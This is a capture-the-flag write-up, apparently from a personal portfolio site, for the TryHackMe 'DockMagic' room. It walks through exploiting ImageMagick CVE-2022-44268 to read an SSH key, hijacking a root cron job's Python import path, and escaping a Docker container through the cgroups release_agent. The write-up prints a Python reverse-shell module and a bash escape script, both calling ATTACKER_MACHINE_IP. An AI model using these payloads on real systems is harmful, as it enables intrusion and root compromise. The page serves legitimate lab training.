@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DockMagic CTF Writeup | Minimalist Portfolio</title>
+<link rel="stylesheet" href="/assets/css/style.css">
+
+<link rel="stylesheet" href="/assets/css/posts.css">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link rel="icon" href="data:,">
+<meta name="description" content="Cybersecurity professional specializing in ethical hacking, penetration testing, and threat hunting.">
+<meta name="keywords" content="cybersecurity, ethical hacking, penetration testing, threat hunting, security analyst">
+</head>
+<body>
+  <!-- Spotlight Cursor Effect -->
+  <div class="spotlight"></div>
+
+  <header class="header-navbar">
+    <div class="header-inner">
+       <div class="logo-quack-wrap">
+                  <div class="logo">
+                    <span class="quack-text">QUACK</span>
+                    Gooduck
+                  </div>
+                </div>
+      <nav class="nav-links">
+        <a href="/#home">Home</a>
+        <a href="/#experience">Experience</a>
+        <a href="/#certifications">Certifications</a>
+        <a href="/write-ups.html" class="active">Write-ups</a>
+      </nav>
+      <div class="social-links">
+        <a href="https://github.com/yourusername" target="_blank"><i class="fab fa-github"></i></a>
+        <a href="https://linkedin.com/in/yourprofile" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="mailto:your.email@example.com"><i class="fas fa-envelope"></i></a>
+      </div>
+    </div>
+  </header>
+  <div class="container post-container">
+    <main>
+      <h1 id="tryhackme-dockmagic-writeup">TryHackMe: DockMagic Writeup</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>Focus:</strong> Linux, Boot2Root, Web, PrivEsc, Docker, ImageMagick.</td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p><strong>Room link:</strong> <a href="https://tryhackme.com/room/dockmagic">https://tryhackme.com/room/dockmagic</a></p>
+</blockquote>
+
+<p>Hey everyone! Today we’re breaking into <strong>DockMagic</strong>. This box is a wild ride that starts with a sneaky image vulnerability, moves into some Python environment abuse, and finishes with a full-on breakout from a Docker container.</p>
+
+<hr />
+
+<h2 id="1-scouting--subdomain-hunting-flag-1">1. Scouting &amp; Subdomain Hunting (Flag 1)</h2>
+
+<p>I started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to see what doors were open.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+<p>Only two ports? Pretty standard. Visiting the site on port 80 pointed me toward <code class="language-plaintext highlighter-rouge">site.empman.thm</code>, so I updated my hosts file:
+<code class="language-plaintext highlighter-rouge">echo '10.49.187.183 site.empman.thm' &gt;&gt; /etc/hosts</code></p>
+
+<p>The site lets you create an account and login. I tried poking at the image upload feature, thinking maybe I could get a reverse shell through a file upload vulnerability, but the filters were too strong.</p>
+
+<p>Since “empman.thm” seemed like a parent domain, I figured there might be subdomains hiding in the shadows. I fired up <code class="language-plaintext highlighter-rouge">gobuster</code> for some vhost enumeration:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster vhost -w /root/Desktop/Tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://empman.thm --append-domain</code></p>
+
+<p><strong>Found it:</strong> <code class="language-plaintext highlighter-rouge">backup.empman.thm</code>.</p>
+
+<p>Inside that backup subdomain, I found a <code class="language-plaintext highlighter-rouge">ImageMagick.zip</code> file. The <code class="language-plaintext highlighter-rouge">README.txt</code> inside confirmed it was <strong>version 7</strong>. This was the “Aha!” moment—I bet the main site is using this exact version to process the profile pictures I tried to upload earlier.</p>
+
+<hr />
+
+<h2 id="2-exploiting-imagemagick-entry-point">2. Exploiting ImageMagick (Entry Point)</h2>
+
+<p>Knowing the version, I searched for vulnerabilities and found <strong>CVE-2022-44268</strong>, an Arbitrary File Read vulnerability.</p>
+
+<p>Basically, you can craft a malicious PNG that, when processed by ImageMagick, embeds the contents of a file from the server into the resulting image. I followed this guide on Exploit-DB to craft my payload:</p>
+<blockquote>
+  <p><strong>Reference:</strong> <a href="https://www.exploit-db.com/exploits/51261">https://www.exploit-db.com/exploits/51261</a></p>
+</blockquote>
+
+<p>I used the exploit to “read” <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. It worked! I saw a user named <strong>emp</strong>. Next logical step? Try to grab their SSH private key:</p>
+<ol>
+  <li>I crafted a PNG to read <code class="language-plaintext highlighter-rouge">/home/emp/.ssh/id_rsa</code>.</li>
+  <li>Uploaded it to the site.</li>
+  <li>Downloaded the processed image and extracted the hex data.</li>
+  <li>Converted the hex back to text, and boom—I had <strong>emp’s private key</strong>.</li>
+</ol>
+
+<p>I saved the key, fixed the permissions (<code class="language-plaintext highlighter-rouge">chmod 600</code>), and SSH’d right in. <strong>Flag 1 secured!</strong></p>
+
+<hr />
+
+<h2 id="3-python-library-hijacking-flag-2">3. Python Library Hijacking (Flag 2)</h2>
+
+<p>Now that I was in as <code class="language-plaintext highlighter-rouge">emp</code>, I needed to get to Root. I checked the system’s cron jobs:</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/crontab</code></p>
+
+<p>I found this interesting line:</p>
+
+<p><code class="language-plaintext highlighter-rouge">* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py</code></p>
+
+<p>This is a massive misconfiguration. The <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> is being set to <code class="language-plaintext highlighter-rouge">/dev/shm</code> (a world-writable directory) <em>before</em> the system folders. This is a textbook <strong>Python Library Hijacking</strong> scenario.</p>
+
+<p>I checked the contents of <code class="language-plaintext highlighter-rouge">/usr/local/sbin/backup.py</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import cbackup
+import time
+cbackup.init('/home/emp/app')
+</code></pre></div></div>
+
+<p>It imports a module called <code class="language-plaintext highlighter-rouge">cbackup</code>. Since I can write to <code class="language-plaintext highlighter-rouge">/dev/shm</code>, I can just create my own <code class="language-plaintext highlighter-rouge">cbackup.py</code> there with a reverse shell payload. When the cron job runs every minute, it will look in <code class="language-plaintext highlighter-rouge">/dev/shm</code>, find my malicious script, and run it as <strong>root</strong>.</p>
+
+<p>I created <code class="language-plaintext highlighter-rouge">/dev/shm/cbackup.py</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket, os, subprocess
+def init(path):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("ATTACKER_MACHINE_IP", 4444))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/bash", "-i"])
+</code></pre></div></div>
+<p>I caught the shell on my listener and grabbed <strong>Flag 2</strong>.</p>
+
+<hr />
+
+<h2 id="4-cgroups-release_agent-docker-escape-flag-3">4. Cgroups Release_Agent Docker Escape (Flag 3)</h2>
+
+<p>Even though I was “root,” I couldn’t find the third flag anywhere. I tried searching high and low:</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -type f -name "flag3.txt" 2&gt;/dev/null</code></p>
+
+<p>Nothing. Then it hit me: the challenge is called <strong>DockMagic</strong>. Am I in a container?</p>
+
+<p>I checked <code class="language-plaintext highlighter-rouge">/proc/1/cgroup</code> and saw “docker” everywhere. Yep, I was trapped in a Docker container. I needed to escape to the host machine. I used a tool called <strong>Deepce</strong> to check for escape vectors:</p>
+<blockquote>
+  <p><strong>Reference:</strong> <a href="https://github.com/stealthcopter/deepce.git">https://github.com/stealthcopter/deepce.git</a></p>
+</blockquote>
+
+<p>It confirmed I was in a privileged-ish container. I found a brilliant blog post about escaping via <strong>cgroups release_agent</strong>:</p>
+<blockquote>
+  <p><strong>Reference:</strong> <a href="https://medium.com/@indigoshadowwashere/docker-container-escape-by-exploiting-cgroups-e52efab898d3">https://medium.com/@indigoshadowwashere/docker-container-escape-by-exploiting-cgroups-e52efab898d3</a></p>
+</blockquote>
+
+<p>I’ll admit, I felt like a bit of a script kiddy copy-pasting this, but hey, if it works, it works! T-T. Here’s the exploit script I used to trigger a reverse shell on the <strong>host machine</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" &gt; /tmp/cgrp/release_agent
+echo '#!/bin/sh' &gt; /exploit
+echo '/bin/bash -i &gt;&amp; /dev/tcp/ATTACKER_MACHINE_IP/4445 0&gt;&amp;1' &gt;&gt; /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+</code></pre></div></div>
+
+<p>I executed it, and my second listener lit up. I was finally on the host machine as <code class="language-plaintext highlighter-rouge">vagrant</code>. I found <strong>flag3.txt</strong> in the home directory.</p>
+
+<p><strong>Game over!</strong></p>
+
+    </main>
+  </div>
+
+  <script>
+    // Spotlight cursor effect
+    const spotlight = document.querySelector('.spotlight');
+
+    document.addEventListener('mousemove', (e) => {
+      const x = (e.clientX / window.innerWidth) * 100;
+      const y = (e.clientY / window.innerHeight) * 100;
+      spotlight.style.setProperty('--x', `${x}%`);
+      spotlight.style.setProperty('--y', `${y}%`);
+    });
+
+    // Focus effect for cards
+    document.addEventListener('DOMContentLoaded', () => {
+      const cards = document.querySelectorAll('.project-card, .job-item');
+
+      cards.forEach(card => {
+        card.addEventListener('mouseenter', () => {
+          document.body.classList.add('focus-mode');
+        });
+
+        card.addEventListener('mouseleave', () => {
+          document.body.classList.remove('focus-mode');
+        });
+      });
+
+      // Experience tabs functionality
+      const jobItems = document.querySelectorAll('.job-item');
+      const jobDetails = document.querySelector('.job-details');
+
+      jobItems.forEach((item, index) => {
+        item.addEventListener('click', () => {
+          // Remove active class from all items
+          jobItems.forEach(i => i.classList.remove('active'));
+          // Add active class to clicked item
+          item.classList.add('active');
+
+          // Update job details
+          const jobTitle = item.querySelector('h3').textContent;
+          const company = item.querySelector('.company').textContent;
+          const bullets = item.getAttribute('data-bullets').split('|');
+
+          jobDetails.querySelector('h3').textContent = jobTitle;
+          jobDetails.querySelector('.role').textContent = company;
+
+          // Update bullets
+          const ul = jobDetails.querySelector('ul');
+          ul.innerHTML = '';
+          bullets.forEach(bullet => {
+            const li = document.createElement('li');
+            li.textContent = bullet;
+            ul.appendChild(li);
+          });
+        });
+      });
+
+      // Navigation highlighting based on scroll position
+      const navLinks = document.querySelectorAll('.nav-links a');
+      const sections = document.querySelectorAll('section[id]');
+
+      function highlightNavOnScroll() {
+        const scrollY = window.pageYOffset;
+
+        sections.forEach(section => {
+          const sectionTop = section.offsetTop - 100; // Offset for better UX
+          const sectionHeight = section.offsetHeight;
+          const sectionId = section.getAttribute('id');
+
+          if (scrollY >= sectionTop && scrollY < sectionTop + sectionHeight) {
+            navLinks.forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${sectionId}`) {
+                link.classList.add('active');
+              }
+            });
+          }
+        });
+      }
+
+      // Smooth scrolling for navigation
+      navLinks.forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+          const href = this.getAttribute('href');
+          if (href.startsWith('#')) {
+            e.preventDefault();
+            const target = document.querySelector(href);
+            if (target) {
+              target.scrollIntoView({
+                behavior: 'smooth'
+              });
+            }
+          }
+          // For external links or page links, let them navigate normally
+        });
+      });
+    });
+  </script>
+</body>
+</html>
